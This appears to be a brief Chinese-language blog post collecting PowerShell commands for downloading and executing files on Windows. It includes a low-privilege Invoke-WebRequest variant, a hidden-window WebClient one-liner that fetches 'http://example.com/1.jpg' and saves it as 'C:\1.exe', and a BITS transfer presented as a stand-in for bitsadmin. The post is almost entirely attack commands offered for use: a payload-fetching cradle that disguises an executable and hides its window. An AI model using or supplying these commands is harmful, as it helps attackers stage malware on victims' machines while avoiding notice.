---
layout: post
title: Windows下cmd下载执行
---

## Powershell

在某些低权限情况下只能使用这个命令，使用`-UseBasicParsing`避免调用IE解析DOM

`Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing`

`powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://example.com/1.jpg','C:\1.exe')`

替代bitsadmin

`Start-BitsTransfer -Source $file -Destination C:\1.exe –Asynchronous`
